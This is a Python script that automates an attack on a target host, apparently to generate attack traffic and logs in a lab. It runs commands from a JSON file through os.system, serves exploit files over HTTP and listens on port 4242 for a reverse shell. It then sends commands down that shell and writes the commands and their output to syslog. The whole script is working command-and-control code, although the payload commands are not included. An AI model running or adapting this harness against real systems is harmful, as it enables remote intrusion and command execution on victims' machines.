#!/usr/bin/env python3
import re
import os
import sys
import json
import time
import socket
import argparse
import datetime
import http.server
import socketserver

from threading import Thread

from random import randint
from time import sleep

DIRECTORY = "/exploit_material"

attackbox = ""
target_os_ip = ""
replace_subnet_ip = ""

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)

def cmd_parser(target,target_os,commands):

	with open(commands) as f:
		data = json.load(f)

	for cmd in data["commands"]:

		sleep(randint(5,20))

		updated_cmd = cmd.replace("target", target).replace("attackbox",attackbox).replace("os_ip",target_os_ip)

		now = datetime.datetime.now()
		syslog_timestamp = now.strftime("%b %d %H:%M:%S")

		with open("/var/log/syslog","a") as sys_log_file:
			sys_log_file.write("{}: {}\n".format(syslog_timestamp,updated_cmd))

		if updated_cmd == "py_listener":
			listen("0.0.0.0",4242,target_os)

		elif updated_cmd == "py_server":
			server_thread = Thread(target=simple_server, args=(8000,))
			server_thread.start()			

		else:
			print(updated_cmd)
			os.system(updated_cmd)
	try:
		server_thread.join()
	except Exception as e:
		print(str(e))

def listen(ip,port,target_os):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)

	if replace_subnet_ip == "172.28":

		os.system("curl http://172.28.0.1:18200")

	if replace_subnet_ip == "172.30":

		os.system("curl http://172.30.0.1:18201")

	print("Listening on port {}".format(str(port)))
	conn, addr = s.accept()
	print("Connection received from {}".format(addr))
	
	now = datetime.datetime.now()
	syslog_timestamp = now.strftime("%b  %d %H:%M:%S")
	
	with open("/var/log/syslog","a") as sys_log_file:
			sys_log_file.write("{}: Listening on port {}\n".format(syslog_timestamp, str(port)))
			sys_log_file.write("{}: Connection received from {}\n".format(syslog_timestamp, addr))

	with open(commands) as f:
		data = json.load(f)

	for cmd in data["rev_shell_commands"]:
		sleep(randint(5,20))
		#Send commands

		updated_cmd = cmd.replace("target", target).replace("attackbox",attackbox).replace("os_ip",target_os_ip)

		updated_cmd += "\n"
		print(updated_cmd)
		conn.send(updated_cmd.encode())
		time.sleep(1)
		

		if target_os == "alpine":
			ans = ""
		else:
			ans = conn.recv(1024).decode()
		#sys.stdout.write(ans)

		now = datetime.datetime.now()
		syslog_timestamp = now.strftime("%b  %d %H:%M:%S")

		with open("/var/log/syslog","a") as sys_log_file:
			sys.stdout.write(ans+"\n")
			sys_log_file.write("{}: {}\n".format(syslog_timestamp,ans+"\n"))


def simple_server(port):

	with socketserver.TCPServer(("", port), Handler) as httpd:
		print("serving at port", port)
		httpd.serve_forever()


if __name__ == '__main__':

	parser = argparse.ArgumentParser(description="CHANGEME")

	parser.add_argument("-target", help="The target to scan" ,required=True)
	parser.add_argument("-target_os", help="The target_os" ,required=True)
	parser.add_argument("-commands", help="The commands to run - If left blank will default to commands.json in current dir" ,default="commands.json")

	args = parser.parse_args()
	target = args.target
	target_os = args.target_os
	commands = args.commands

	replace_subnet = re.match(r"\d{1,3}.\d{1,3}",target)
	replace_subnet_ip = replace_subnet.group()
	attackbox = "{}.0.157".format(replace_subnet_ip)
	target_os_ip = "{}.0.200".format(replace_subnet_ip)

	cmd_parser(target,target_os,commands)
	